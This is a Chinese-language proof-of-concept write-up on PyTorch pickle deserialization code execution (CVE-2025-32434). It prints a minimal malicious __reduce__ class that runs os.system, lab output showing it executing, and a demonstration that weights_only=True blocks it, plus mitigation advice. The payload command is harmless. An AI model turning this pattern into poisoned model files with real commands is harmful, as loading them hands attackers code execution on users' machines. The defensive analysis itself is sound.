# ML Model Deserialization RCE — Attack Chain Analysis (CVE-2025-32434)

> **PoC 复现 + 攻防闭环验证**：构造恶意模型文件（.pt/.pkl），利用 pickle 反序列化在加载时触发任意代码执行，并演示 `weights_only=True` 防护如何阻断。完全隔离容器内运行，无害命令。
> **版本**：v1.0 · 攻击面：ML Model Supply Chain（模型供应链）

---

## 0. 摘要

**漏洞本质**：PyTorch `torch.load()` 底层使用 pickle 反序列化。当从不信任来源加载模型文件（`.pt`/`.pkl`/HuggingFace 权重等）时，若文件中嵌入恶意的 `__reduce__` 对象，反序列化过程会**在加载阶段自动执行任意命令**——这是模型供应链攻击最致命的落点（加载模型 = 跑任意代码）。

**实测结论（本 PoC）**：
- 构造 **97 字节**恶意 `.pt` 文件 → 加载触发 `os.system` → 命令执行
- 同一文件 + `weights_only=True` 安全加载 → **RCE 被成功阻断**

---

## 1. 漏洞信息

| 项 | 值 |
|----|----|
| 漏洞 | PyTorch torch.load 反序列化 RCE |
| CVE | **CVE-2025-32434**（NVD/SentinelOne 公开）|
| 触发点 | `torch.load()` 默认非安全反序列化 |
| 影响 | 加载恶意模型 → 任意代码执行 |
| 同源机制 | Python `pickle` 反序列化不信任输入的固有风险类（CVE-2023-... 系列、lmdeploy 等均有同类）|

---

## 2. 攻击原理与利用链

### 2.1 核心机制：pickle 的 `__reduce__` 钩子

pickle 协议在反序列化到对象时，如果对象实现了 `__reduce__`，会**自动调用其返回的 (函数, 参数)**。攻击者利用这一点让 `__reduce__` 返回 `os.system(command)`：

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('touch /tmp/rce_demo',))
```

- `pickle.dumps(Exploit())` → 恶意二进制文件（伪装成 `.pt` 模型）
- 受害者 `torch.load()` → pickle 解析 → 命中 `__reduce__` → `os.system('touch /tmp/rce_demo')` **立即执行**

### 2.2 利用链（攻击路径）

```
攻击者                        受害者
  │  构造恶意.pt文件              │
  │  __reduce__→os.system(cmd)    │
  │  ──────────────────► 下载/加载模型
  │        恶意恶意.pt            │ torch.load("model.pt")
  │                              │  └→ pickle反序列化
  │                              │       └→ __reduce__ 触发
  │                              │            └→ os.system(cmd) ← RCE!
```

### 2.3 实际攻击场景（真实威胁）

- **HuggingFace 权重投毒**：模型仓库中的 `.bin`/`.safetensors` 或加载代码被投毒
- **共享/下载的模型文件**：开发者 `torch.load()` 了不信任来源的模型
- **模型转换/工具链**：处理第三方模型的脚本无防备反序列化
- **CI/CD 供应链**：训练/评估流水线加载被投毒的模型

---

## 3. PoC 验证结果

### 3.1 环境（完全隔离）
- 容器：`redteam-attacker`（python3.12-slim，隔离网络 `lab_internal`）
- 无害命令：`touch /tmp/rce_demo` + `id`
- 未联网、未反弹shell、未改系统

### 3.2 攻击成功（不安全加载）

```
[+] 恶意文件已生成: malicious_model.pt (97 bytes)
[*] 加载: malicious_model.pt
uid=0(root) gid=0(root) groups=0(root)
RCE_TRIGGERED_BY_PICKLE
[✔] RCE 触发成功: /tmp/rce_demo 被创建
    → 证明: 加载不可信 pickle 文件 = 任意代码执行
```

### 3.3 防御生效（weights_only=True）

```
[-] 安全加载: torch.load(weights_only=True)
[✔] 攻击被阻止: [BLOCKED] 拒绝加载: posix.system (weights_only 禁止任意类)
    RCE 触发验证: /tmp/rce_demo 存在 = False  ← 未执行
```

**攻防对比**：同一份恶意文件 → 不安全加载触发 RCE / 安全加载阻断 RCE。

---

## 4. 防护建议（按优先级）

| # | 措施 | 说明 |
|---|------|------|
| 1 | **用 `weights_only=True`** | PyTorch 官方修复，默认拒绝任意类。**首选项** |
| 2 | **避免 `pickle` 加载不信任数据** | 核心原则：不给 pickle 不信任输入 |
| 3 | **用安全模型格式** | Safetensors（无代码执行，仅张量序列化）优于 pickle 系 |
| 4 | **校验模型来源/签名** | HuggingFace 仓库白名单、校验和、来源审计 |
| 5 | **最小权限运行** | 加载/训练进程用低权限用户、容器隔离 |

> **核心原则（与 Agent 安全一致）**：不信任输入格式，权限在边界强制。

---

## 5. 局限说明（诚实声明）

- 本 PoC 复现**已知公开机制**（CVE-2025-32434），非 0-day 挖掘
- 在 `python3.12-slim` 用纯 pickle 复现，未实际安装 PyTorch（机制一致：torch.load 底层即 pickle）
- 无害命令仅作证明，真实攻击会用反弹shell/下载执行等
- 验证覆盖 RCE 触发 + weights_only 阻断两个核心点

---

## 6. 与作者背景的关联（技术迁移叙事）

- **GPU 内核 UAF 利用**（Mate60 root）——内存释放后利用执行控制
- **本 PoC**——反序列化加载时利用执行控制
- **共同点**：识别"不信任边界的时机窗口"（释放后 / 加载时），构造触发点拿到执行原语
- **差异化**：从内核内存利用 → 模型文件/数据面利用，同一套"找触发点→构造利用→控制执行"方法论

---

## 7. 文件清单

| 文件 | 作用 |
|------|------|
| `redteam/scripts/poc_build_malicious.py` | 构造恶意 .pt/.pkl 文件 |
| `redteam/scripts/poc_victim_load.py` | 模拟受害者不安全加载，验证 RCE |
| `redteam/scripts/poc_defense_weightsonly.py` | 演示 weights_only=True 防御阻断 |

---

*所有测试于完全隔离的 Docker 容器内进行，无害命令，数据为演示性质。*
